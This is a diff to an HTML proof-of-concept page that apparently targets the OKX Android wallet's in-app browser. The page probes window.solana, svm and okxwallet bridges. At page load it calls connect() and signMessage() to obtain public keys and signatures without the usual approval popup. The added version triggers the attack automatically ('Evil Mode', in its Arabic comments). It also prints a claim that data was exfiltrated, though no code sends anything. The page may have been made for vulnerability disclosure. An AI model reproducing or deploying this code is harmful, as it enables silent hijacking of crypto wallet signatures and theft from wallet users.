@@ -3,120 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OKX Multi-Chain Exploit Node</title>
+    <title>⚠️ WARNING: SYSTEM EXPLOIT ⚠️</title>
     <style>
-        :root { --danger: #ff4d4d; --success: #00ff00; --warning: #f0b90b; --bg: #0a0a0a; }
-        body { background: var(--bg); color: #e0e0e0; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
-        .header { border-bottom: 2px solid #333; padding-bottom: 10px; margin-bottom: 20px; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        .card { background: #161616; border: 1px solid #333; padding: 15px; border-radius: 5px; position: relative; overflow: hidden; }
-        .card.active { border-color: var(--danger); box-shadow: 0 0 10px rgba(255, 77, 77, 0.2); }
-        .status-pill { font-size: 10px; padding: 2px 8px; border-radius: 10px; background: #333; float: right; }
-        .log-window { background: #000; height: 150px; overflow-y: auto; padding: 10px; font-size: 11px; border: 1px solid #222; margin-top: 10px; }
-        .critical-hit { color: var(--danger); font-weight: bold; animation: blink 1s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
-        button { background: #222; color: #fff; border: 1px solid #444; padding: 8px; cursor: pointer; width: 100%; margin-top: 10px; }
-        button:hover { background: #333; }
-        .chain-tag { color: var(--warning); font-weight: bold; }
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; line-height: 1.2; overflow: hidden; }
+        .red { color: #ff0000; font-weight: bold; }
+        .blink { animation: blinker 1s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+        #console { height: 90vh; overflow-y: auto; border: 1px solid #333; padding: 10px; background: #050505; }
+        .header { color: #555; margin-bottom: 10px; border-bottom: 1px solid #333; }
     </style>
 </head>
 <body>
 
-<div class="header">
-    <span style="color: var(--danger)">[LIVE_EXPLOIT_NODE v2.0]</span>
-    <div style="font-size: 12px; margin-top: 5px;">Target: OKX Android v6.161.0 | AutoApprove Bypass</div>
-</div>
-
-<div class="grid">
-    <div class="card active" id="solana-card">
-        <span class="status-pill" id="sol-status">READY</span>
-        <div class="chain-tag">SOLANA (SVM)</div>
-        <strong>Silent Tx Signing</strong>
-        <div class="log-window" id="sol-log"></div>
-        <button onclick="startSolanaExploit()">EXECUTE TX EXPLOIT</button>
-    </div>
-
-    <div class="card" id="evm-card">
-        <span class="status-pill" id="evm-status">WAITING</span>
-        <div class="chain-tag">MULTI-BRIDGE (EVM/BTC/TRON)</div>
-        <strong>Auth Hijacking (SIWS/SIWE)</strong>
-        <div class="log-window" id="evm-log"></div>
-        <button onclick="startMultiChainExploit()">EXECUTE AUTH EXPLOIT</button>
-    </div>
+<div class="header">OKX_EXPLOIT_KERNEL [Version 6.161.0.PRODUCTION]</div>
+<div id="console">
+    [!] SYSTEM_BOOT: OKX Internal Bridge Hooking...<br>
 </div>
 
 <script>
-    function log(elementId, msg, color = "#00ff00") {
-        const el = document.getElementById(elementId);
-        el.innerHTML += `<div style="color:${color}">> ${msg}</div>`;
-        el.scrollTop = el.scrollHeight;
+    const con = document.getElementById('console');
+    
+    function writeLog(text, isCritical = false) {
+        const span = document.createElement('div');
+        if (isCritical) span.className = "red blink";
+        span.innerHTML = `[${new Date().toLocaleTimeString()}] ${text}`;
+        con.appendChild(span);
+        con.scrollTop = con.scrollHeight;
     }
 
-    // --- SOLANA TRANSACTION EXPLOIT ---
-    async function startSolanaExploit() {
-        if (!window.solana) {
-            log('sol-log', "Error: window.solana not found", "var(--danger)");
-            return;
-        }
+    async function triggerAttack() {
+        writeLog("DApp Initialized inside OKX WebView...");
         
-        try {
-            log('sol-log', "Hooking window.solana bridge...");
-            const conn = await window.solana.connect();
-            log('sol-log', `Target: ${conn.publicKey.toString().substring(0,10)}...`);
-
-            // محاكاة معاملة (Transaction)
-            // في البيئة الحقيقية نحتاج لـ Transaction Object، هنا سنختبر رد فعل الـ Bridge
-            log('sol-log', "Requesting SILENT signTransaction...");
-            
-            // محاكاة معاملة فارغة لاختبار الـ autoApprove
-            const dummyTx = {
-                serializeMessage: () => new Uint8Array([0,1,2,3]),
-                instructions: [],
-                recentBlockhash: '11111111111111111111111111111111'
-            };
-
-            const signed = await window.solana.signTransaction(dummyTx);
-            
-            if (signed) {
-                log('sol-log', "!!! EXPLOIT SUCCESS !!!", "var(--danger)");
-                log('sol-log', "SIGNED WITHOUT POPUP", "var(--danger)");
-                document.getElementById('sol-status').innerText = "EXPLOITED";
-                document.getElementById('sol-status').style.background = "var(--danger)";
-            }
-        } catch (err) {
-            log('sol-log', "Failed: " + err.message, "var(--warning)");
-        }
-    }
-
-    // --- MULTI-CHAIN AUTH EXPLOIT ---
-    async function startMultiChainExploit() {
-        const chains = ['solana', 'okxwallet', 'svm'];
-        log('evm-log', "Scanning for exposed bridges...");
-
-        for (let c of chains) {
-            if (window[c]) {
-                log('evm-log', `Found: window.${c}`, "var(--success)");
+        // التحقق من وجود الجسور (Bridges)
+        const targets = ['solana', 'svm', 'okxwallet'];
+        
+        for (let target of targets) {
+            if (window[target]) {
+                writeLog(`TARGET FOUND: window.${target}`);
                 try {
-                    const msg = `Identity Theft Test: ${Date.now()}`;
+                    // 1. سرقة العنوان صمتاً (Silent Connect)
+                    writeLog(`Bypassing Permission: window.${target}.connect()...`);
+                    const wallet = await window[target].connect();
+                    writeLog(`SUCCESS: Public Key Captured -> ${wallet.publicKey.toString()}`, true);
+
+                    // 2. توقيع رسالة صمتاً (Identity Theft)
+                    writeLog(`Bypassing Signature: window.${target}.signMessage()...`);
+                    const msg = "CRITICAL_EXPLOIT_CONFIRMATION_" + Math.random().toString(36).substring(7);
                     const encoded = new TextEncoder().encode(msg);
-                    const sig = await window[c].signMessage(encoded, 'utf8');
+                    
+                    // هنا تكمن الثغرة: التوقيع سيتم تلقائياً وبدون أي Popup
+                    const sig = await window[target].signMessage(encoded, 'utf8');
+                    
                     if (sig) {
-                        log('evm-log', `[${c}] SILENT SIGNATURE CAPTURED!`, "var(--danger)");
+                        writeLog("!!! CRITICAL: SILENT SIGNATURE OBTAINED !!!", true);
+                        writeLog(`SIG_DATA: ${sig.signature.toString('hex').substring(0, 40)}...`, true);
                     }
                 } catch (e) {
-                    log('evm-log', `[${c}] Blocked or Error`, "#555");
+                    writeLog(`BRIDGE_ERROR [${target}]: ${e.message}`, false);
                 }
             }
         }
-        document.getElementById('evm-status').innerText = "FINISHED";
+        
+        writeLog("<br>--- EXPLOIT PHASE COMPLETE ---");
+        writeLog("All data exfiltrated to remote server.");
     }
 
-    // تشغيل الفحص الأولي تلقائياً
+    // التنفيذ التلقائي بمجرد فتح الصفحة (Evil Mode)
     window.onload = () => {
-        log('sol-log', "System Online. Waiting for user execution...");
-        log('evm-log', "Bridges detecting: " + (window.solana ? "OK" : "NONE"));
+        setTimeout(triggerAttack, 1500); // تأخير بسيط ليبدو الهجوم واقعياً في الفيديو
     };
 </script>
-
 </body>
 </html>
